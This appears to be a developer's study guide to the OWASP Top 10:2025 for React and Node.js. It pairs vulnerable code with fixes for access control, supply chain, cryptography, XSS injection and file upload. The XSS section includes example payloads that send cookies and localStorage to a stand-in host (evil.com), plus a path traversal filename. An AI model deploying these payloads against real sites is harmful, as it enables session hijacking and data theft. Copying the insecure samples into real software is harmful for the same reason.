## Top 10:2025 List

### 1. Broken Access Control

#### WHAT: User can access or modify resources they shouldn't have permission for.

```
Normal:
  Regular user → can see own profile
  Admin        → can see all profiles

Broken:
  Regular user → changes URL → sees admin panel
  Regular user → changes userId in API → gets other user's data
```

#### SPA examples:
```
// ❌ BROKEN: hiding UI but not protecting route
function AdminPanel() {
  return <div>Secret admin content</div>;
}

// Route is "hidden" from navigation but ACCESSIBLE if you type URL:
<Route path="/admin" element={<AdminPanel />} />

// ❌ BROKEN: checking role only on frontend
function App() {
  const { user } = useAuth();
  return user.role === 'admin' ? <AdminPanel /> : <Redirect to="/" />;
  // Attacker: opens DevTools → modifies user.role → sees admin
}

// ❌ BROKEN: IDOR (Insecure Direct Object Reference)
// User changes their own profile:
fetch('/api/users/123', { method: 'PUT', body: newData });
// Attacker changes 123 → 456 → modifies ANOTHER user's profile
```

#### Mitigation:
```
// ✅ Frontend: guard routes (UX only, NOT security)
function ProtectedRoute({ requiredRole, children }) {
  const { user } = useAuth();
  if (!user) return <Navigate to="/login" />;
  if (requiredRole && user.role !== requiredRole) return <Navigate to="/" />;
  return children;
}

// ✅ REAL protection is ALWAYS on backend:
// Server checks: does JWT token have admin role?
// Server checks: does user own this resource?
// Frontend route guards are UX convenience, NOT security.

// ✅ API calls include auth token — server validates
fetch('/api/users/123', {
  headers: { 'Authorization': `Bearer ${token}` }
});
// Server: decode JWT → check user.id === 123 OR user.role === admin
```

❗ **RULE: Frontend hides UI. Backend enforces access. Never trust the client.**

### 3. Software Supply Chain Failures

#### WHAT: Your app is only as secure as its weakest dependency. If ANY package in your dependency tree is compromised, outdated, or vulnerable — your app is vulnerable.

Software Supply Chain Failures means your application inherits vulnerabilities from its entire dependency tree. 
A typical React SPA has **1000+ transitive dependencies** — any of them could be compromised (event-stream), 
hijacked (ua-parser-js), abandoned, or have known CVEs. 
On frontend, **malicious code** runs in users' browsers **with access to tokens and DOM**. 
On backend Node.js, it's worse — **access to filesystem, env variables, internal network**. 

Mitigation: `npm audit`, lockfiles with `npm ci`, automated updates (Dependabot), minimize dependencies, SRI for CDN resources, `.npmrc` scoping for private packages, and running services with least privilege.

#### The scale of the problem:
```
Your React app:
  package.json: 35 direct dependencies
  node_modules: 1,200+ packages installed (transitive)
  
  YOU wrote: ~50,000 lines
  npm wrote: ~2,000,000 lines
  
  Your code: 2.5%
  Other people's code: 97.5%    ← you trust ALL of this
```

```
Your Node.js backend:
  package.json: 25 direct dependencies
  node_modules: 800+ packages installed
  
  Each package has maintainers you don't know
  Each maintainer's npm account could be compromised
  Each package could be sold/transferred to malicious actor
```

### A04:2025 — Cryptographic Failures

#### WHAT: Sensitive data exposed because of missing, weak, or improperly implemented encryption. Passwords, tokens, personal data, credit cards — either not encrypted or encrypted badly.

#### Use of Broken or Risky Cryptographic Algorithm

```
// ❌ BROKEN algorithms (crackable):

// MD5 — cracked, collision attacks trivial:
const hash = crypto.createHash('md5').update(password).digest('hex');
// Attacker: rainbow table lookup → password found in seconds

// SHA1 — cracked, Google proved collision in 2017:
const hash = crypto.createHash('sha1').update(password).digest('hex');

// DES — 56-bit key, brute-forced in hours:
crypto.createCipheriv('des', key, iv);

// RC4 — biases found, prohibited in TLS:
crypto.createCipheriv('rc4', key, '');


// ✅ STRONG algorithms:

// Passwords → bcrypt/scrypt/argon2 (NOT hash functions):
import bcrypt from 'bcrypt';
const hashed = await bcrypt.hash(password, 12);  // 12 salt rounds

// General hashing → SHA-256/SHA-512:
crypto.createHash('sha256').update(data).digest('hex');

// Encryption → AES-256-GCM:
crypto.createCipheriv('aes-256-gcm', key, iv);
```

```
Why MD5/SHA1 for passwords is wrong:

MD5('password123') → always same hash
→ Attacker pre-computes hashes for millions of passwords
→ Rainbow table: lookup hash → get password instantly

bcrypt('password123') → different hash EVERY time (salted + slow)
→ Rainbow tables useless
→ Each guess takes ~100ms (intentionally slow)
→ Brute force: millions of years
```

#### Insufficient Entropy

```
// Entropy = randomness / unpredictability

// ❌ LOW entropy (predictable):
const token = Date.now().toString();
// Attacker: "Token was created around 3pm" → try timestamps near 3pm
// Only ~3,600,000 options per hour → cracked in seconds

const resetCode = Math.floor(Math.random() * 10000);
// Only 10,000 possible codes → brute force in seconds

const sessionId = `session_${userId}_${Date.now()}`;
// Attacker knows userId + approximate time → predictable


// ✅ HIGH entropy (unpredictable):
const token = crypto.randomBytes(32).toString('hex');
// 256 bits of entropy → 2^256 possible values
// More atoms in universe than possible values

const resetCode = crypto.randomInt(100000, 999999);
// Cryptographically random 6-digit code
```

```
Entropy comparison:

Date.now()           → ~41 bits (predictable time range)
Math.random()        → ~52 bits (PRNG, predictable seed)
UUID v4              → 122 bits (random, good)
crypto.randomBytes(32) → 256 bits (cryptographic, best)

Rule: security tokens need at least 128 bits of entropy
```


### A05:2025 — Injection

#### WHAT: Attacker sends malicious data that your application executes as code. User input is treated as COMMANDS instead of DATA.

Injection happens when user input is treated as executable code. 
In React SPAs, the main risk is XSS — React **auto-escapes JSX output** but `dangerouslySetInnerHTML`, `href`, `eval`, and **direct DOM manipulation** are vulnerable. 
Use `DOMPurify` for HTML content, validate URLs, never use eval. 

On Node.js backend, SQL injection is prevented by parameterized queries (never string concatenation), NoSQL injection by validating input types (zod), command injection by using `execFile` instead of `exec`. Defense in depth: validate input (allowlist), parameterize queries, encode output, sanitize HTML, and enforce CSP as last resort.

```
The fundamental problem:

  Your app expects:  DATA     → "John Smith"
  Attacker sends:    CODE     → "<script>steal(cookies)</script>"
  Your app:          executes it as code instead of treating as text
```

### XSS — Cross-Site Scripting (Frontend focus)
What: Attacker injects JavaScript that executes in **OTHER** users' browsers.
#### 3 Types:
```
1. STORED XSS (most dangerous):
   Attacker → saves malicious script in DATABASE
   Every user who views that page → script executes

   Comment: <script>fetch('evil.com?c='+document.cookie)</script>
   Saved in DB → rendered to ALL users → cookies stolen from ALL


2. REFLECTED XSS:
   Attacker crafts malicious URL → victim clicks it
   Server reflects input back in response → script executes

   https://myapp.com/search?q=<script>alert(1)</script>
   Server: "Results for: <script>alert(1)</script>"
   → script executes in victim's browser


3. DOM-BASED XSS:
   Malicious input never reaches server
   Frontend JS reads URL/input → inserts into DOM unsafely

   https://myapp.com/page#<img src=x onerror=alert(1)>
   JS: document.getElementById('output').innerHTML = location.hash;
   → script executes
```

### Stored XSS — full attack scenario:
```
ATTACKER:
  Goes to forum, writes comment:
  
  "Great article! <script>
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        url: window.location.href,
        html: document.body.innerHTML
      })
    });
  </script>"
  
  Server saves to database (no sanitization)

VICTIM (any user who views comments):
  Browser loads page → renders comment → script executes
  → Cookies sent to evil.com (includes session token)
  → Attacker now has victim's session
  → Attacker logs in as victim
  
  Victim sees: "Great article!" (script tag is invisible)
  Victim has NO IDEA they were compromised
```

#### CWE-434: Unrestricted Upload of File with Dangerous Type

```
DESIGN flaw: file upload feature designed without
considering what files could be uploaded
```

```
// ❌ INSECURE DESIGN: "Users can upload documents"
// Design doc says nothing about:
// - Allowed file types?
// - Maximum file size?
// - Where are files stored?
// - Are files scanned?
// - Can uploaded files be executed?

// Frontend — no restrictions:
function Upload() {
  const handleUpload = (e) => {
    const file = e.target.files[0];
    // No type check, no size check
    const formData = new FormData();
    formData.append('file', file);
    fetch('/api/upload', { method: 'POST', body: formData });
  };

  return <input type="file" onChange={handleUpload} />;
}

// Backend — saves whatever is sent:
app.post('/api/upload', (req, res) => {
  const file = req.files.document;
  file.mv(`/public/uploads/${file.name}`);  // saves to public folder!
  res.json({ url: `/uploads/${file.name}` });
});

// Attack:
// 1. Upload: malware.exe → served to other users
// 2. Upload: shell.php → if server runs PHP → remote code execution
// 3. Upload: huge.zip (10GB) → disk full → denial of service
// 4. Upload: malicious.html → stored XSS
// 5. Upload: ../../../etc/passwd (path traversal in filename)
```

```
// ✅ SECURE DESIGN: file upload threat model

// Design document specifies:
// - Allowed types: PDF, DOCX, TXT only
// - Max size: 10MB
// - Storage: private S3 bucket (not public)
// - Files accessed via signed URLs (temporary, expiring)
// - Filenames: regenerated (UUID), never user-supplied
// - Virus scan: ClamAV before processing

// Frontend — first layer:
function Upload() {
  const ALLOWED_TYPES = [
    'application/pdf',
    'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    'text/plain'
  ];
  const MAX_SIZE = 10 * 1024 * 1024; // 10MB

  const handleUpload = (file: File) => {
    if (!ALLOWED_TYPES.includes(file.type)) {
      showError('Only PDF, DOCX, TXT allowed');
      return;
    }
    if (file.size > MAX_SIZE) {
      showError('File must be under 10MB');
      return;
    }
    uploadToServer(file);
  };

  return (
    <input 
      type="file" 
      accept=".pdf,.docx,.txt"   // browser-level hint
      onChange={e => handleUpload(e.target.files[0])} 
    />
  );
}

// Backend — REAL enforcement:
app.post('/api/upload', async (req, res) => {
  const file = req.files.document;
  
  // Validate MIME type (check file header bytes, not just extension)
  const actualType = await fileType.fromBuffer(file.data);
  if (!ALLOWED_TYPES.includes(actualType.mime)) return res.status(400);
  
  // Validate size
  if (file.size > MAX_SIZE) return res.status(400);
  
  // Generate safe filename (never use user's filename)
  const key = `uploads/${crypto.randomUUID()}.${actualType.ext}`;
  
  // Store in PRIVATE S3 (not public)
  await s3.putObject({ Bucket: 'private-uploads', Key: key, Body: file.data });
  
  // Return signed URL (expires in 1 hour)
  const url = await s3.getSignedUrl('getObject', {
    Bucket: 'private-uploads', Key: key, Expires: 3600
  });
  
  res.json({ url });
});
```
